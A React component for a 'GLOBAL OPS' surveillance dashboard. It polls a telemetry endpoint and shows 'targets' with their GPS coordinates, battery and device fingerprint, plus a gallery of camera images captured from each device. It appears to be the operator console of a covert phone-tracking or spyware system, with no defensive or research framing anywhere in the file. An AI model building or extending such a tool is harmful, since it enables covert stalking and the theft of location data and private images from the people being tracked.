"use client";
import { useState, useEffect } from "react";
import {
  Map,
  Battery,
  Smartphone,
  Camera,
  RefreshCw,
  Crosshair,
  Globe,
} from "lucide-react";

export default function SurveillanceDashboard() {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [loading, setLoading] = useState(true);

  const fetchDevices = async () => {
    try {
      const res = await fetch("/api/telemetry");
      const data = await res.json();
      if (data.success) {
        setDevices(data.data);
        // If we have a selected device, update its data from the list if available
        if (selectedDevice) {
          const updated = data.data.find(
            (d) => d.deviceId === selectedDevice.deviceId
          );
          if (updated) setSelectedDevice(updated);
        }
      }
    } catch (err) {
      console.error("Failed to fetch devices", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 5000); // Poll every 5s
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-black text-green-500 font-mono flex">
      {/* Sidebar - Device List */}
      <div className="w-80 border-r border-green-900 flex flex-col">
        <div className="p-4 border-b border-green-900 bg-green-900/10">
          <h1 className="text-xl font-bold flex items-center gap-2">
            <Globe className="w-5 h-5" /> GLOBAL OPS
          </h1>
          <div className="text-xs text-green-700 mt-1">
            ACTIVE TARGETS: {devices.length}
          </div>
        </div>

        <div className="flex-1 overflow-y-auto">
          {devices.map((device) => (
            <div
              key={device._id}
              onClick={() => setSelectedDevice(device)}
              className={`p-4 border-b border-green-900/50 cursor-pointer hover:bg-green-900/20 transition-colors ${
                selectedDevice?.deviceId === device.deviceId
                  ? "bg-green-900/30 border-l-4 border-l-green-500"
                  : ""
              }`}
            >
              <div className="flex justify-between items-start">
                <div className="font-bold text-sm">{device.deviceId}</div>
                <div className="text-[10px] text-gray-400">
                  {new Date(device.timestamp).toLocaleTimeString()}
                </div>
              </div>
              <div className="flex gap-2 mt-2 text-xs text-gray-400">
                <span className="flex items-center gap-1">
                  <Battery className="w-3 h-3" />{" "}
                  {Math.round(device.battery?.level || 0)}%
                </span>
                <span className="flex items-center gap-1">
                  <Smartphone className="w-3 h-3" />{" "}
                  {device.deviceInfo?.platform || "Unknown"}
                </span>
              </div>
            </div>
          ))}

          {devices.length === 0 && !loading && (
            <div className="p-8 text-center text-gray-600 text-sm">
              NO ACTIVE SIGNALS DETECTED
            </div>
          )}
        </div>
      </div>

      {/* Main Content - Detail View */}
      <div className="flex-1 flex flex-col bg-[url('/grid.png')] bg-repeat opacity-90">
        {selectedDevice ? (
          <div className="p-6 h-full overflow-y-auto">
            {/* Header */}
            <div className="flex justify-between items-center mb-8">
              <div>
                <h2 className="text-2xl font-bold flex items-center gap-3">
                  <Crosshair className="w-8 h-8 animate-spin-slow" />
                  TARGET: {selectedDevice.deviceId}
                </h2>
                <div className="text-sm text-green-700 font-mono mt-1">
                  LAST SEEN:{" "}
                  {new Date(selectedDevice.timestamp).toLocaleString()}
                </div>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={fetchDevices}
                  className="p-2 border border-green-700 rounded hover:bg-green-900/50"
                >
                  <RefreshCw className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
              {/* Location Card */}
              <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)]">
                <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
                  <Map className="w-4 h-4" /> GEOLOCATION DATA
                </h3>
                {selectedDevice.location ? (
                  <div className="space-y-2 font-mono text-sm">
                    <div className="flex justify-between">
                      <span>LATITUDE:</span>
                      <span className="text-white">
                        {selectedDevice.location.latitude}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span>LONGITUDE:</span>
                      <span className="text-white">
                        {selectedDevice.location.longitude}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span>ACCURACY:</span>
                      <span className="text-white">
                        {selectedDevice.location.accuracy}m
                      </span>
                    </div>
                    <div className="mt-4 h-32 bg-green-900/20 rounded flex items-center justify-center border border-green-900/50 text-xs text-green-800">
                      [MAP VISUALIZATION PLACEHOLDER]
                    </div>
                  </div>
                ) : (
                  <div className="text-red-500">NO GPS SIGNAL</div>
                )}
              </div>

              {/* Battery & System Card */}
              <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)]">
                <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
                  <Battery className="w-4 h-4" /> POWER & SYSTEM
                </h3>
                <div className="space-y-2 font-mono text-sm">
                  <div className="flex justify-between">
                    <span>BATTERY:</span>
                    <span
                      className={`${
                        selectedDevice.battery?.level < 20
                          ? "text-red-500"
                          : "text-white"
                      }`}
                    >
                      {Math.round(selectedDevice.battery?.level || 0)}%
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span>STATUS:</span>
                    <span className="text-white">
                      {selectedDevice.battery?.charging
                        ? "CHARGING"
                        : "DISCHARGING"}
                    </span>
                  </div>
                  <div className="border-t border-green-900 my-2 pt-2"></div>
                  <div className="flex justify-between">
                    <span>MEMORY:</span>
                    <span className="text-white">
                      {selectedDevice.deviceInfo?.memory} GB
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span>CORES:</span>
                    <span className="text-white">
                      {selectedDevice.deviceInfo?.cores}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span>PLATFORM:</span>
                    <span className="text-white">
                      {selectedDevice.deviceInfo?.platform}
                    </span>
                  </div>
                </div>
              </div>

              {/* Network/User Agent */}
              <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)]">
                <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
                  <Smartphone className="w-4 h-4" /> FINGERPRINT
                </h3>
                <div className="text-xs break-all text-gray-300 font-mono">
                  {selectedDevice.deviceInfo?.userAgent}
                </div>
                <div className="mt-4 text-xs text-green-600">
                  IP: [HIDDEN] <br />
                  ISP: [HIDDEN]
                </div>
              </div>
            </div>

            {/* Captured Images Gallery */}
            <div className="border-t border-green-900 pt-6">
              <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                <Camera className="w-5 h-5" /> SURVEILLANCE FEED
              </h3>
              {selectedDevice.images && selectedDevice.images.length > 0 ? (
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                  {selectedDevice.images.map((img, idx) => (
                    <div
                      key={idx}
                      className="relative group border border-green-800 rounded overflow-hidden"
                    >
                      <img
                        src={img.url}
                        alt="Captured"
                        className="w-full h-48 object-cover opacity-80 group-hover:opacity-100 transition-opacity"
                      />
                      <div className="absolute bottom-0 left-0 right-0 bg-black/70 text-[10px] p-1 text-center">
                        {new Date(img.capturedAt).toLocaleString()}
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-gray-500 italic text-sm border border-dashed border-green-900 p-8 text-center rounded">
                  No visual data captured yet.
                </div>
              )}
            </div>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center text-green-800 flex-col gap-4">
            <Crosshair className="w-24 h-24 animate-pulse" />
            <div className="text-xl tracking-widest">
              SELECT A TARGET TO MONITOR
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
